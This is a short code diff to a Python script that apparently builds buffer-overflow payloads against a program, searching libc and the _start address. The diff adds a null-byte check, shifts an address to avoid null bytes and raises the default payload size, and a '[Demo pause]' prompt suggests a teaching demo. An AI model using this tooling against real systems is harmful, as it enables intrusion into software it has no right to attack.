@@ -19,6 +19,11 @@ import click
 
 # accept filename as parameter
 
+def has_null_bytes(hexstr):
+    if "00" in hexstr:
+        return True
+    return False
+
 def cleanup(start_payload_name):
     try:
         if len(start_payload_name) > 0:
@@ -58,7 +63,7 @@ while valid_probing_mode == False:
 max_payload_size = 0
 valid_payload_size = False
 while valid_payload_size == False:
-    max_payload_size = click.prompt('Please enter maximum payload size', type=int, default=500)
+    max_payload_size = click.prompt('Please enter maximum payload size', type=int, default=600)
     print("")
     if max_payload_size > 0:
         valid_payload_size = True
@@ -136,6 +141,12 @@ exit_found, exit_address_offset = b_handler.search_function(b_handler.libc_path,
 sstart_found, sstart_address = b_handler.search_asm_function(program_name, '_start')
 
 print("Found address of _start", sstart_address)
+
+if has_null_bytes(sstart_address):
+    print("WARNING, address contains NULL bytes, will make a minor change")
+    sstart_address_int = int(sstart_address, 16)
+    sstart_address_int = sstart_address_int + 4
+    sstart_address = hex(sstart_address_int)[2:]
 
 print("")
 click.confirm('[Demo pause] Press any key to continue', default="y")
